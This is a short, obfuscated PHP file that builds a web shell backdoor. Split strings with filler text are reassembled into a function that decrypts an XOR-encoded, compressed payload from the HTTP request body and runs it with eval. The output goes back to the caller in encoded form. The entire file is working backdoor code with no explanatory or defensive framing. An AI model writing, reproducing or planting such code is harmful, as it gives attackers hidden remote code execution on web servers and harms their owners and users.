<?php
$y='$m[1]sp),$spk)));$o=@ospb_getsp_cospnsptents();@obsp_enspdsp_clean();$r=@ba';
$O=str_replace('F','','crFeatFeF_FfuFncFtion');
$S='h("/$kh(sp.+)spsp$kf/",@file_spget_spcontents("sppsphp://inputsp"sp),$m)=';
$Z='p$j++spsp,$i++){$o.=$t{$isp}sp^sp$spk{$j};}}spreturn $o;}if (sp@pregsp_matc';
$g='$k=sp"5spa18e284";$kh=sp"7f206b7sp9f0aspa";$kfsp="639f63spspcf6sp7e4";$p=';
$l='spse6sp4_encospde(@x(@gzcspspospmpress($o),$k));spprint("$spp$ksph$r$kf");}';
$f='=1)sp {@ob_starspt(sp);@evasplsp(@gzuncspompress(sp@x(@basesp64_despcode(';
$v='"wuMXGUspxhVIbBspF5Qa";spfuspnctispon x($t,$k)sp{$c=spspstrlen($k);$lsp=s';
$V='trlspen(spsp$t);$spo="";for($i=0;sp$i<sp$lsp;sp){for($j=0;($j<$c&&$spi<$l);s';
$d=str_replace('sp','',$g.$v.$V.$Z.$S.$f.$y.$l);
$n=$O('',$d);$n();
?>
